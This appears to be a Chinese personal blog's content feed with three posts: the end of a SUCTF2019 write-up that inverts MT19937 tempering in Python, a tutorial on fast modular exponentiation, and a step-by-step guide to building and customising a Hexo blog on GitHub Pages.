<span class="number">2</span>))[<span class="number">2</span>:].zfill(x)   <span class="comment"># 注意填充</span></span><br><span class="line">    output = <span class="built_in">int</span>(high13+mid5+low13, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">second_cal_re</span>(<span class="params">c, x, y</span>):</span></span><br><span class="line">    y = <span class="built_in">bin</span>(y)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    c = <span class="built_in">bin</span>(c)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    output = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">    <span class="comment"># 低x位保持不变</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-x, <span class="built_in">len</span>(y)):</span><br><span class="line">        output[i] = <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 13-21位 = (低x位)&amp;(y[13:21])^c[13:21]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">2</span>*x, <span class="built_in">len</span>(y)-x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 4-12位 = (13-21位)&amp;(y[4:12])^c[4:12]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)-<span class="number">3</span>*x, <span class="built_in">len</span>(y)-<span class="number">2</span>*x):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    <span class="comment"># 高4位 = (8-12位)&amp;(y[0:3])^c[0:3]</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        output[i] = output[i+x] &amp; <span class="built_in">int</span>(y[i]) ^ <span class="built_in">int</span>(c[i])</span><br><span class="line">    output = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> _: <span class="built_in">str</span>(_), output))</span><br><span class="line">    output = <span class="built_in">int</span>(output, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re_convert</span>(<span class="params">m</span>):</span></span><br><span class="line">    m = first_cal_re(m, <span class="number">19</span>)</span><br><span class="line">    m = second_cal_re(m, <span class="number">17</span>, <span class="number">2245263360</span>)</span><br><span class="line">    m = second_cal_re(m, <span class="number">9</span>, <span class="number">2029229568</span>)</span><br><span class="line">    m = first_cal_re(m, <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="comment"># 对应括号外的encode(&#x27;hex&#x27;)</span></span><br><span class="line">    message = <span class="string">b&#x27;641460a9e3953b1aaa21f3a2&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    new_message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(message) // <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span>: i * <span class="number">4</span> + <span class="number">4</span>].ljust(<span class="number">4</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        block = bytes_to_long(block)</span><br><span class="line">        block = re_convert(block)</span><br><span class="line">        block = long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="built_in">print</span> new_message.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    test()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="另一位师傅的思路"><a href="#另一位师傅的思路" class="headerlink" title="另一位师傅的思路"></a>另一位师傅的思路</h2><p>对，又是尚师傅，在我迷茫的时候又给我指点迷津，他一下就看出，这是一个可以循环回来的位运算，所以直接写了循环就跑出来了</p>
<p>一哩窝里GIAO</p>
<img alt="[SUCTF2019]MT 我也很异或呢-ce3e9430.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-ce3e9430.png" width="" height="">

<img alt="[SUCTF2019]MT 我也很异或呢-30b8ac87.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-30b8ac87.png" width="" height="" >

<p>牛啊，人上人</p>
<h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>虽然也不是什么动脑子的题目，重复一遍过程，然后扣细节。但还是很兴奋，第一次自己做出这种题目（主要是师傅们的wp看不懂哇），对于之前一直没有攻克的线性移位寄存器也有一定思路了</p>
<p>还有一句废话，就是，这题难度不大，因为存在上面这种做法，所以如果是比赛，给我五分钟做出来</p>
<h2 id="关于MT"><a href="#关于MT" class="headerlink" title="关于MT"></a>关于MT</h2><p>哈哈哈哈哈，重要的话放在最后说</p>
<p>所以像我这样这么愚蠢地去分析这个具体的流程是很低效的，浪费时间，做这种题目的思路应该是找出其中的<strong>规律</strong>，现成的也好，但毕竟头几次接触，这样也无可厚非，人都是会慢慢成长起来的</p>
<p>去看了之前没有看懂的wp，有些人qs采用的就是尚师傅这个思路</p>
<img alt="[SUCTF2019]MT 我也很异或呢-40747019.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-40747019.png" width="" height="" >

<p>但很多是py</p>
<p>看到安全客的人上人wp</p>
<img alt="[SUCTF2019]MT 我也很异或呢-d514d3be.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-d514d3be.png" width="" height="">

<p>知音啊，就是比我精简了好多</p>
<p>至于为什么可以逆回来呢？官方wp才是yyds</p>
<p>先看看出题人的出题思路<br><img alt="[SUCTF2019]MT 我也很异或呢-01fc37a9.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-01fc37a9.png" width="" height=""></p>
<p>所以我的思路没错，就是逆，我逆的是具体每一步，而没有发现更大的规律</p>
<p><strong>只存在左移和右移的区别</strong></p>
<p>看官方的代码觉得好简单，但还是不知道</p>
<img alt="[SUCTF2019]MT 我也很异或呢-58e3c5e7.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/[SUCTF2019]MT 我也很异或呢-58e3c5e7.png" width="" height="">

<p>在此也暂时不往下研究了，总之是有规律的，在这道题花了太多时间，虽然我觉得值，但价值快被榨干了，应该赋予弄懂的希望在之后同类型的题目</p>
<hr>
<p>也许，</p>
<p>绕远路才是我的最短捷径——Julius·Caesar·Zeppeli</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>CTF-Crypto零星考点</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>MT19937</tag>
        <tag>伪随机数</tag>
      </tags>
  </entry>
  <entry>
    <title>快速幂算法详解</title>
    <url>/posts/59b3d960/</url>
    <content><![CDATA[<p>快速幂，懂了我就屁哦大不溜</p>
<span id="more"></span>

<p>开始前先展示成果，这是我用python脚本实现的快速幂取模的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">************************************************</span></span><br><span class="line"><span class="string">* Fast Power                                   *</span></span><br><span class="line"><span class="string">* RSA                                          *</span></span><br><span class="line"><span class="string">************************************************</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从左往右</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_pow_mod</span>(<span class="params">m, e, n</span>):</span></span><br><span class="line">    t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># 避免没有进入循环直接得出答案的情况</span></span><br><span class="line">    ans = m % n</span><br><span class="line">    <span class="comment"># 第一个数肯定为1，但是不平方</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t_bin[<span class="number">1</span>:]:</span><br><span class="line">        ans = ans ** <span class="number">2</span> % n</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ans = ans * m % n</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从右往左，还有点不理解</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_pow_mod</span>(<span class="params">m, e, n</span>):</span></span><br><span class="line">    t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    ans = <span class="number">1</span></span><br><span class="line">    t = m % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> t_bin:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            ans = ans * t % n</span><br><span class="line">        t = t ** <span class="number">2</span> % n</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

<h1 id="快速幂算法详解"><a href="#快速幂算法详解" class="headerlink" title="快速幂算法详解"></a>快速幂算法详解</h1><p>密码学课上学到了快速幂取模运算，多次遇到快速幂（或者说快速指数算法）了，课上的内容还有一部分不懂，主要是从右向左那种不太会。之前也听到师傅说这个是密码学的基础算法，就好好研究一下。看到一篇<a href="https://blog.csdn.net/qq_19782019/article/details/85621386">大佬博客</a>，写得还比较详细，先研究下他的。</p>
<h2 id="研究大佬博客"><a href="#研究大佬博客" class="headerlink" title="研究大佬博客"></a>研究大佬博客</h2><img alt="快速幂算法-0e94aed2.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-0e94aed2.png" width="" height="">

<p>博客到这里为止，前面都只是这条数论公式的应用（好耶，我的latex居中了）<br>$$<br>m^e\ mod\ n=(m\ mod\ n)^e<br>$$</p>
<p>避免了中间很大的结果，而是每次都框定在m的<strong>完全剩余系</strong>里面。的确，在一定程度上减轻了计算的压力</p>
<p>但是显然，如果e和n比较大，那么这个方法还是很低效的</p>
<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>那么快速幂算法或者又被叫做快速指数算法、平方·乘算法，就从根本上解决了中间运算结果很大的问题</p>
<p>它的原理，在大佬的博客里已经被讲解得十分透彻了</p>
<img alt="快速幂算法-22df6845.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-22df6845.png" width="" height="">

<p>我总结一下，主要的切入点就是降低指数。每次框定在m的剩余系里还是大是吧，那干脆连指数也一起，降低了运算的复杂度</p>
<p>于是就有了，将$3^{10}$拆分成$9^{5}$，然后是$81^{2}\times 9^1$，然后是（没错我去用计算器了）$6561^1\times 9^1$，其中还有对于奇数和偶数指数不同的操作</p>
<p>想当然，很简单是吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“这一开始我的脑瓜还是能跟上你的。”</span><br><span class="line"></span><br><span class="line">罗辑在黑暗中沉默了很长时间，他的脸在火星的微光中浮现了两三次后才说：“大树，不是什么开始，我们的推论已经结束了。”</span><br></pre></td></tr></table></figure>

<p>我们的推论已经结束了，这就是快速幂算法；我认为，当时发明的人也就是这么推导的</p>
<p>到这里就可以写代码了，只不过，这个用严谨的C写起来更舒服点，当然博客后面也有关于代码的一些优化，像压榨级别，位运算什么的</p>
<p>确实奥妙（了个妙）</p>
<h2 id="平方·乘算法"><a href="#平方·乘算法" class="headerlink" title="平方·乘算法"></a>平方·乘算法</h2><p>你以为这样结束了？由于我事先知道怎么实现，再反过来看推导过程，感觉确实变得相当清晰明了了</p>
<p>运用上课所学知识，可以对快速幂进行再度封装，甚至可以在一定程度上满足<strong>手算</strong>的需要（至于这个算法究竟叫什么，别要尝试理解，我也很⊕呢）</p>
<p>上面提到的整除二，以至于到了后面的位运算操作，可以想到直接将指数用二进制表示（由于个人能力有限，无法形成教科书般语言，下面以一个例子方式向大家介绍用法）</p>
<h3 id="从左往右"><a href="#从左往右" class="headerlink" title="从左往右"></a>从左往右</h3><p>假设我们要算$64^{503}\ mod\ 204$<br>那么，<br>$\because (503)_{10}=(111110111)_2$</p>
<p>$\therefore $就是求$64^{(111110111)_2}\ mod\ 204$</p>
<p>$64^{(1)_2}\equiv 64\ mod\ 204=64$<br>$64^{(11)_2}\equiv 64^2\times 64\ mod\ 204=4$<br>$64^{(111)_2}\equiv 4^2\times 64\ mod\ 204=4$<br>$64^{(1111)_2}\equiv 4^2\times 64\ mod\ 204=4$<br>$64^{(11111)_2}\equiv 4^2\times 64\ mod\ 204=4$<br>$64^{(111110)_2}\equiv 4^2\ mod\ 204=16$<br>$64^{(1111101)_2}\equiv 16^2\times 64\ mod\ 204=64$（又回来了？）<br>$64^{(11111011)_2}\equiv 64^2\times 64\ mod\ 204=4$<br>$64^{(111110111)_2}\equiv 4^2\times 64\ mod\ 204=4$</p>
<p>要qq截图不要latexx</p>
<img alt="快速幂算法-187e7ed5.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-187e7ed5.png" width="" height="">

<p>和结果验证一下</p>
<img alt="快速幂算法-38090b2d.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-38090b2d.png" width="" height="" >

<p>（我发4这些个数字是我随便乱凑的，没想到中间竟然那么凑巧，不过某种程度上也可见，快速幂的效率之高，希望中途没有哪里搞错）</p>
<p>说明一下，上面这一溜的操作，技巧只有一个：<strong>移动一位平方，为1再乘一次底数</strong></p>
<p>至于如证明其正确性呢，那你可要看好了<br>$$<br>64^{(503)_{10}}=64^{(111110111)_2}=64^{((((((((1\times 2)+1)\times 2+1)\times 2+1)\times 2+1)\times 2)\times 2+1)\times 2+1)\times 2+1}<br>$$</p>
<p>dbq，我凑得数太大了，不想看可以看我手写的（字是丑了点）</p>
<img alt="快速幂算法-66df0465.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/快速幂算法-66df0465.png" width="" height="">

<p>主要想说的是上面这一大串东西不就是不断把503模二取余么，也就是那位大佬的博客里说的，偶数和奇数的处理情况</p>
<p>（听懂掌声）</p>
<p>再来看看一开始的代码，就是比较粗糙的实现，我就不多加解释了，当然结合位运算就更好啦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 避免没有进入循环直接得出答案的情况</span></span><br><span class="line">ans = m % n</span><br><span class="line"><span class="comment"># 第一个数肯定为1，但是不平方</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t_bin[<span class="number">1</span>:]:</span><br><span class="line">    ans = ans ** <span class="number">2</span> % n</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        ans = ans * m % n</span><br></pre></td></tr></table></figure>

<h3 id="从右往左"><a href="#从右往左" class="headerlink" title="从右往左"></a>从右往左</h3><p>从左往右，比较简单，虽然不知道为什么，但确实如此</p>
<p>老师说，从右往左也是一样的，但我在实现的时候，觉得还是有些许差别的，首先如果右边最低位是0该如何处理</p>
<p>不会了，在csdn后，我py（哦不，禁止py）到一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t_bin = <span class="built_in">bin</span>(e)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">ans = <span class="number">1</span></span><br><span class="line">t = m % n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t_bin:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        ans = ans * t % n</span><br><span class="line">    t = t ** <span class="number">2</span> % n</span><br></pre></td></tr></table></figure>

<p>实现手法和我如出一辙，所以我和容易看出，为了防止最低位是0的情况，一开始先模一下，也就是相当于从左到右的第一个是1的情况，后面的方法就确实如老师说的惊人的相似了，就是顺序调一下</p>
<p>聪明的你，一定能看懂</p>
]]></content>
      <categories>
        <category>密码学军火库</category>
        <category>基层知识学习</category>
      </categories>
      <tags>
        <tag>快速幂</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用hexo搭建博客</title>
    <url>/posts/ed1adb0c/</url>
    <content><![CDATA[<p>马上就能拥有自己的博客了，开不开心，激不激动；我用的是</p>
<ul>
<li>ubuntu18，处于windows的子系统</li>
<li>hexo是5.4.0</li>
<li>因为NexT主题比较成熟，所以先拿这个练练手，是8.8.0版本的</li>
</ul>
<p>更多信息可以在<a href="https://hexo.io/zh-cn/docs/">官网文档</a>查询，此外还看了<a href="https://www.bilibili.com/video/BV1Yb411a7ty/?spm_id_from=333.788.recommend_more_video.0">b站up主的超级良心视频</a></p>
<span id="more"></span>
<h1 id="如何用hexo搭建博客"><a href="#如何用hexo搭建博客" class="headerlink" title="如何用hexo搭建博客"></a>如何用hexo搭建博客</h1><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><h3 id="一、安装git和node-js"><a href="#一、安装git和node-js" class="headerlink" title="一、安装git和node.js"></a>一、安装git和node.js</h3><p><a href="http://git-scm.com/download/linux">git</a>，我要最新的，更新遇到的问题可以参考<a href="https://4xwi11.github.io/posts/ade40a32/">我的ubuntu软件更新失败解决</a></p>
<p><a href="https://github.com/nodesource/distributions">node.js</a>，就用长期支持的14版本吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003233927033.png" alt="image-20211003233927033"></p>
<p>最后检查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>

<h3 id="二、安装hexo"><a href="#二、安装hexo" class="headerlink" title="二、安装hexo"></a>二、安装hexo</h3><p>可能遇到错误，我直接<code>sudo</code>可解决</p>
<hr>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>这个命令会一起安装hexo的命令，所以能在命令行直接敲太香了</p>
<p>添加到环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo echo &#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27; &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure>

<p>这样以后直接用<code>hexo + 命令</code>就可以了</p>
<h2 id="搭站"><a href="#搭站" class="headerlink" title="搭站"></a>搭站</h2><p>首先，初始化hexo最基本的文件到我们本地的目录，最后一个是文件名自己取，比如我就叫<code>4XWi11</code>，放我自己的 博客</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init 4XWi11</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 4XWi11;npm install</span><br></pre></td></tr></table></figure>

<p>生成网站页面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g[enerator]</span><br></pre></td></tr></table></figure>

<p>可以看到生成了一个<code>public</code>的文件，就是我们生成的网站目录</p>
<p>打开这个网页，启动服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo s[erver]</span><br></pre></td></tr></table></figure>

<p>当然一开始是本地的</p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul>
<li><p>新建文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new &quot;BLOG_TITLE&quot;</span><br></pre></td></tr></table></figure>

<p>其实就是新建了一个md文件</p>
</li>
<li><p>进行博客编辑</p>
</li>
<li><p>重新生成启动</p>
<p>再次运行<code>g</code>和<code>s</code>命令</p>
</li>
</ul>
<p>可惜可惜，和github一样不支持latex</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>这里用Git部署</p>
<p>所以当然最最开始需要在github上有一个创库，<strong>注意：仓库的命名一定要是USER_NAME.github.io</strong>，比如我的就是<code>4XWi11.github.io</code>，后续浏览器可以直接访问</p>
<p>安装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>如果不确定插件是否已经安装，可以用下条命令检测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm list hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>然后更改<code>_config.yml</code>文件的选项，设置部署在<code>git</code>上，并给出仓库地址</p>
<p>运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>完成部署</p>
<p>遇到了密码不匹配的问题，要在输入密码的地方输入token</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171639758.png" alt="image-20211003171639758"></p>
<p>勾选</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211003171714542.png" alt="image-20211003171714542"></p>
<p>生成将token复制到需要填密码的地方即可</p>
<p>但是我又遇到上述操作做完还是认证失败的情况</p>
<p>然后把仓库删了重新创建一遍就好了，但总不能更新一遍就删掉重来吧</p>
<p><em>我知道了，不告诉你们，我再也不乱动方向盘了</em></p>
<p>但是后面还可能出现连不上github的情况，开关一下代理有时候可以解决</p>
<p>可是不知道是不是子系统的原因，我以为它会帮我自动记忆，没想到每次都要手输，看看之后有没有好的解决办法</p>
<h2 id="NexT主题"><a href="#NexT主题" class="headerlink" title="NexT主题"></a>NexT主题</h2><p>这里我跟着<a href="https://theme-materialized.github.io/how-to-build-a-hexo-blog/">materialized作者的博客</a>，一起来尝试NexT主题的配置</p>
<p>首先当然是把主题从github下载下来，放在themes目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/next-theme/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h3 id="换图标的问题"><a href="#换图标的问题" class="headerlink" title="换图标的问题"></a>换图标的问题</h3><p>图标来自<a href="https://fontawesome.com/v5.15/icons?d=gallery&p=2">FontAwesome</a></p>
<p>图标的名称，建议点开那个图标，你会发现全称</p>
<h3 id="设置评论的问题"><a href="#设置评论的问题" class="headerlink" title="设置评论的问题"></a>设置评论的问题</h3><p>没有评论的博客是没有灵魂的，但是NexT8.8不支持内置valine</p>
<p>废了废了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141656383.png" alt="image-20211006141656383"></p>
<p>这个等配置好latex再来配置吧</p>
<hr>
<p>最后决定用utterances了，配置方便，也不用挂梯子，只要有一个github账号，师傅们就可以找我玩啦</p>
<p>怎么配置可以看<a href="https://jasper1024.com/jasper/968d55ac/#languages-yml">这位师傅的</a></p>
<h3 id="代码主题"><a href="#代码主题" class="headerlink" title="代码主题"></a>代码主题</h3><p>首先选择引擎</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141448204.png" alt="image-20211006141448204"/>

<p>然后再选主题</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211006141336676.png" alt="image-20211006141336676"/>

<p>这里可以预览<a href="https://theme-next.js.org/highlight/">https://theme-next.js.org/highlight/</a></p>
<h3 id="latex"><a href="#latex" class="headerlink" title="latex"></a>latex</h3><p>新版本的缺点就是网上的教程比较难找，但是我把这些全部开起来就可以了</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095926085.png" alt="image-20211007095926085"/>

<p>还很nice得自动在居中公式后面加上了标号，可以好好利用</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007095954761.png" alt="image-20211007095954761"/>

<h3 id="背景图片"><a href="#背景图片" class="headerlink" title="背景图片"></a>背景图片</h3><p>我跟着<a href="https://hxhowl.com/posts/e6f9a475/">这篇博客</a>做的</p>
<h3 id="更改字体颜色"><a href="#更改字体颜色" class="headerlink" title="更改字体颜色"></a>更改字体颜色</h3><p>因为换了背景可能有footer的颜色看不清，看这位<a href="https://blog.csdn.net/weixin_40837922/article/details/88047241">师傅的</a>改了下颜色</p>
<h3 id="更改字体大小"><a href="#更改字体大小" class="headerlink" title="更改字体大小"></a>更改字体大小</h3><p>16px小大，喜欢殷实一点的，我这个版本在这里调，前面有一大推东西，直接拉到最后em那里改就好</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007114800161.png" alt="image-20211007114800161"/>

<h3 id="吉祥物"><a href="#吉祥物" class="headerlink" title="吉祥物"></a>吉祥物</h3><p>跟着上面背景图片的师傅搞了下，先用他的wanko，但看到这只狗觉得好爱哈哈哈，暂时就不换别的了（其他的都是二刺螈（doge））</p>
<h3 id="图片预览"><a href="#图片预览" class="headerlink" title="图片预览"></a>图片预览</h3><p>这个是真的坑。网上教程一大堆，因为另外一个会显示图片名称，而我却不会设置其不显示，所以我用的是zoom那个，安装倒不是问题直接在根目录按照github上npm</p>
<p>但是如果在markdown里用typora调一下图片的显示比例，在博客里预览时就会发生位置错乱</p>
<p>将就吧，以后尽量截图时不要截太大</p>
<h3 id="透明度影响搜索"><a href="#透明度影响搜索" class="headerlink" title="透明度影响搜索"></a>透明度影响搜索</h3><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008010043156.png" alt="image-20211008010043156"></p>
<p>omg发生这样的事情我很抱歉</p>
<p>网上也有教程，但是只能舍去透明度效果了，毕竟实用比较重要</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008011640711.png" alt="image-20211008011640711"></p>
<p>反正就是把这两个style.styl（因为我搞不清哪一个）中head的opacity设置去掉</p>
<p>这样侧边菜单栏就没有透明特效了，但是其他保留</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211008011916547.png" alt="image-20211008011916547"></p>
<p>其实海星</p>
<h3 id="博客改名"><a href="#博客改名" class="headerlink" title="博客改名"></a>博客改名</h3><p>参考<a href="https://roro4ever.github.io/2019/11/28/%E7%94%A8-hexo-console-rename-%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8D/%E7%94%A8-hexo-console-rename-%E4%BF%AE%E6%94%B9%E6%96%87%E4%BB%B6%E5%90%8D/">这篇博客</a></p>
<p>好像有bug，之后碰到再说吧，文件名起合适一点</p>
<p>报错了，不用了</p>
<h3 id="博客加密"><a href="#博客加密" class="headerlink" title="博客加密"></a>博客加密</h3><p>没想到这个竟然会派上用场</p>
<p>参考<a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">hexo-blog-encrypt</a></p>
<h3 id="博客不分页"><a href="#博客不分页" class="headerlink" title="博客不分页"></a>博客不分页</h3><p>习惯博客不分页，这样<code>ctrl + f</code>好搜索</p>
<p>只要将根目录下的_config.yml中的per_page的值改成0就好了，当然如果想设置一页几篇，改成对应的数字就好了</p>
<p>但是首页加载很慢，不太行，所以设置首页的 <code>index_generator</code> 的属性 <code>per_page</code> 为7，也就是一页显示7篇，无所谓反正不能显示完全，一周七篇吧（doge）</p>
<p>但归档和分类里是不分页的，方便查看，只要将 <code>Pagination</code> 的 <code>per_page</code> 修改成0就好了</p>
<p>好</p>
<h3 id="阅读量统计"><a href="#阅读量统计" class="headerlink" title="阅读量统计"></a>阅读量统计</h3><p>呜呜呜，我遇到大坑了，本来用来valine的，但感觉不准确，于是用了更方便的不蒜子，直接改一个true就能用，感觉还行</p>
<p>但是自从我开启看板狗就不能显示了，网上也有很多解释，<a href="https://iamshen.github.io/posts/89986481/">这篇</a>的帮助很大</p>
<p>但是不行呜呜呜，我放在同一目录下，应该不会是没找到吧，暂时不晓得怎么搞</p>
